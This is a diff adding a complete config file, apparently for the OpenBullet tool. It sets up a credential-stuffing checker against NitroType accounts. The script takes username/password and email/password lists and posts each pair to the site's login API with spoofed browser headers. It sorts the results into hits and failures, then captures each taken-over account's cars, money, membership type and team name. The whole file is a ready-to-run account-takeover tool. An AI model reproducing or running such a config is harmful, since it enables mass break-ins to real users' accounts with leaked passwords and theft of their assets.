@@ -1,0 +1,51 @@
+[SETTINGS]
+{
+  "Name": "NitroType",
+  "SuggestedBots": 50,
+  "LastModified": "2018-10-14T19:29:23.3970057+00:00",
+  "AdditionalInfo": "",
+  "Author": "TomKikrman",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.nitrotype.com/" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "text/html; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.nitrotype.com/" 
+PARSE "<COOKIES(__cfduid)>" LR "" "" Recursive=FALSE -> VAR "CF" "" "" 
+REQUEST POST "https://www.nitrotype.com/api/login" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.nitrotype.com" 
+  HEADER "referer: https://www.nitrotype.com/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+PARSE "<SOURCE>" LR "totalCars\":" ",\"" Recursive=FALSE -> CAP "Total Cars" "" "" 
+PARSE "<SOURCE>" LR ",\"accountType\":\"" "\"," Recursive=FALSE -> CAP "Account Type" "" "" 
+PARSE "<SOURCE>" LR ",\"money\":" ",\"" Recursive=FALSE -> CAP "Money" "" "" 
+PARSE "<SOURCE>" LR ",\"membership\":\"" "\",\"" Recursive=FALSE -> CAP "MemberShip" "" "" 
+PARSE "<SOURCE>" LR "teamName\":\"" ",\"" Recursive=FALSE -> CAP "Team Name" "" "" 
